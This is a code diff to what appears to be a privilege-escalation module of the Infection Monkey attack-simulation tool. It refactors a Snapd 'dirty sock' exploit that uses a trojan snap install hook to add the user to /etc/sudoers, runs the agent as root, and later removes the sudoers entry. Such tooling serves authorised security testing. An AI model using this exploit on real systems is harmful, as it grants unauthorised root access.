@@ -9,15 +9,12 @@ import time
 import string
 import socket
 import random
-import getpass
-import subprocess
 import base64
 from logging import getLogger
 
 from infection_monkey.utils.environment import OperatingSystem, OperatingSystemTypes, OperatingSystemVersion
 from infection_monkey.privilege_escalation.actions import HostPrivExploiter
-from infection_monkey.privilege_escalation.actions.tools import REMOVE_LASTLINE, ADDUSER_TO_SUDOERS
-from infection_monkey.privilege_escalation.actions.tools import is_sudo_paswordless, shell, run_monkey_as_root
+from infection_monkey.privilege_escalation.actions.tools import is_sudo_paswordless, run_monkey_as_root
 LOG = getLogger(__name__)
 
 __author__ = "D3fa1t"
@@ -25,6 +22,7 @@ __author__ = "D3fa1t"
 APPEND_COMMENT = " #"
 SLEEP = 5   # in sec
 PLACEHOLDER_OFFSET = 108  # offset at which we replace the placeholder with our os command
+SUDOERS_FILE_CHANGE_BUFFER_TIME = 20  # in seconds
 
 """
 TROJAN_BASE_SNAP contains a simple snap application with an install hook which takes the cmd from the user 
@@ -241,18 +239,16 @@ class SnapdExploiter(HostPrivExploiter):
         self.file_path = command_line.split(' ')[0]
         self.file_name = os.path.basename(self.file_path)
 
-        # get the current user name
-        whoami = getpass.getuser()
-
-        # Error reading off shell
-        if not whoami:
+        if not run_command_as_root(self.get_add_user_to_sudoers_command()):
+            LOG.info("Snapd Privilege escalation was not successful!")
             return False
 
-        # add the user to the sudo group
-        add_user_to_sudoers = ADDUSER_TO_SUDOERS % {'user_name': whoami}
-
-        if not run_command_as_root(add_user_to_sudoers) or not is_sudo_paswordless():
-            LOG.info("Snapd Privilege escalation was not successful!")
+        # After user is added to sudoers wait a bit for changes to take effect
+        time.sleep(SUDOERS_FILE_CHANGE_BUFFER_TIME)
+        if not is_sudo_paswordless():
+            LOG.info("Snapd Privilege escalation seems to have worked, "
+                     "but monkey still can't run paswordless sudo, aborting!")
+            self.remove_from_sudoers()
             return False
 
         LOG.info("Snapd dirty sock privilege escalation successful!")
@@ -261,9 +257,5 @@ class SnapdExploiter(HostPrivExploiter):
         run_monkey_as_root(command_line)
 
         # now remove the user from sudoers
-        LOG.info("Removing the current user %s from the sudoers list", whoami)
-
-        remove_from_sudoers = REMOVE_LASTLINE % {'file_name': "/etc/sudoers"}
-        subprocess.Popen(remove_from_sudoers, shell=True, stdin=None, stdout=None, stderr=None, close_fds=True,
-                         creationflags=0)
+        self.remove_from_sudoers()
         return True
